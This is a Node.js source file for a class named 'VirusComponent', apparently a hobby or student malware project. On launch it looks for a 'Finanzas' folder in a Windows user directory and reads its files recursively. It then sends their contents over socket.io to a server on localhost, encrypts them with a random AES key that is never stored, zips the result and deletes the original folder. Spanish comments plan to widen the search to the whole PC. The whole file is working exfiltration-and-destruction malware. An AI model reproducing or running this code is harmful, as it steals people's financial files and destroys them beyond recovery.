import fs, { promises } from 'node:fs';
import { join } from 'node:path';
import crypto from 'node:crypto';
import { io } from 'socket.io-client';
import archiver from 'archiver';

class VirusComponent {
    constructor() {}

    async socketConnection(){ 
        const socket = io("ws://localhost:3000", {
            reconnectionDelayMax: 10000,
        });

        socket.on('connect', () => {
            console.log("Connected to server");
        });

        socket.io.on('reconnect', () => {
            console.log("Reconnected to server");
        });

        socket.on('disconnect', () => {
            console.log("Disconnected from server");
        });

        return socket;
    }

    async attack() {
        console.log("***********************************************");
        console.log("Launching Attack...");
        console.log("***********************************************");
        console.log("PHASE1. Searching for Finanzas folder...");
        console.log("***********************************************");
        const finanzasFolderPath = await this.findFolder();
        if(finanzasFolderPath) {
            console.log("PHASE1.SUCCESS. Finanzas folder found at:", finanzasFolderPath);
            console.log("***********************************************");
            console.log("PHASE2. Reading files in Finanzas folder...");
            console.log("***********************************************");
            const textFiles = await this.readFiles(finanzasFolderPath, 'text');
            if(textFiles.length > 0) {
                const socketCli = await this.socketConnection();
                console.log("PHASE2.SUCCESS. Files read successfully.");
                console.log("***********************************************");
                console.log("PHASE3. Sending files to socket server.")
                console.log("***********************************************");

                textFiles.forEach(async file => {
                    await this.sendFileToServer(socketCli, file)
                    .then(() => {
                        console.log("PHASE3.SUCCESS. Files sent successfully.")
                        console.log("***********************************************");
                    }).catch(error => {
                        console.error("PHASE3.ERROR. ", error);
                        return console.log("***********************************************");
                    });
                });
            } else {
                console.log("PHASE2.WARNING. No text files found in the Finanzas folder");
            }
            console.log("PHASE4. Encrypting and compressing files...");
            console.log("***********************************************");
            this.encryptAndZipFolder(finanzasFolderPath, this.generateEncryptionKey());
            console.log("Attack completed.");
            console.log("***********************************************");
        } else {
            console.log("PHASE1.ERROR. Finanzas folder not found in the PC.");
            console.log("Attack stopped...");
            console.log("***********************************************");
            return;
        }
    }
    
    async sendFileToServer(socketCli, file) {
        socketCli.emit('file', file);
    }
    
    generateEncryptionKey () {
        return crypto.randomBytes(32);
    };
    
    encryptFile(filePath, key) {
        const data = fs.readFileSync(filePath);
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(key), iv);
        let encrypted = cipher.update(data);
        encrypted = Buffer.concat([encrypted, cipher.final()]);
        return { iv: iv.toString('hex'), encryptedData: encrypted.toString('hex') };
    }
    
    encryptAndZipFolder(folderPath, key) {
        const zipFileName = folderPath + '.zip';
        const output = fs.createWriteStream(zipFileName);
        const archive = archiver('zip', { zlib: { level: 9 } });
        
        output.on('close', function() {
            fs.rmdirSync(folderPath, { recursive: true });
            console.log(`PHASE4.SUCCESS. Folder encrypted and compressed.`);
            console.log("***********************************************");
        });
        
        archive.pipe(output);
    
        const files = fs.readdirSync(folderPath);
    
        files.forEach(file => {
            const filePath = join(folderPath, file);
            const stats = fs.statSync(filePath);
    
            if (stats.isFile()) {
                const { iv, encryptedData } = this.encryptFile(filePath, key);
                archive.append(encryptedData, { name: file + '.enc' });
            }
        });
    
        archive.finalize();
    }

    //se debe corregir este metodo para que la busqueda sea global en todas las carpeta de la pc y no en una sola como parametro.
    async findFolder(folderPath = 'C:\\Users\\josem') {
        try {
            const files = await promises.readdir(folderPath);
            for (const file of files) {
                const filePath = join(folderPath, file);
                const stats = await promises.stat(filePath);
                if (stats.isDirectory() && file.toLowerCase() === 'finanzas') return filePath;
            }
            return null;
        } catch (error) {
            console.error("PHASE1.ERROR. Something went wrong trying to get 'finanzas' folder path", error);
            throw error;
        }
    }
    
    //la lectura de los archivos binarios tiene un comportamiento inesperado, se debe corregir.
    async readFiles(folderPath, fileType) {
        try {
            const files = await promises.readdir(folderPath);
            const fileContents = [];

            for (const file of files) {
                const filePath = join(folderPath, file);
                const stats = await promises.stat(filePath);
                if (stats.isFile()) {
                    let content;
                    if (fileType === 'text') {
                        content = await promises.readFile(filePath, 'utf8');
                    } else if (fileType === 'binary') {
                        content = await promises.readFile(filePath);
                    }
                    fileContents.push({ name: file, content });
                } else if (stats.isDirectory()) {
                    // Si es un directorio, se busca recursivamente en él
                    const subFiles = await this.readFiles(filePath, fileType);
                    fileContents.push(...subFiles);
                }
            }
            return fileContents;
        } catch (error) {
            console.error("Error al leer los archivos:", error);
            throw error;
        }
    }
}

const virus = new VirusComponent();
virus.attack().catch(console.error);